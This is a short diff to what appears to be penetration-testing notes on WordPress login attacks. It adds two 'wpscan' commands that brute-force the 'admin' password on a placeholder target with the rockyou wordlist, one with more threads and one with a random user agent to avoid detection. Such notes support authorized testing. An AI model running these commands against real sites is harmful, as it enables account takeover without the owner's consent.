@@ -41,3 +41,8 @@ For such cases, try wp-login.php brute force or use wpscan:
 
 ```bash
 wpscan --url https://target.com --usernames admin --passwords /usr/share/wordlists/rockyou.txt
+
+wpscan --url https://www.target.com --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 10
+
+wpscan --url https://www.target.com --random-user-agent --usernames admin --passwords /usr/share/wordlists/rockyou.txt
+
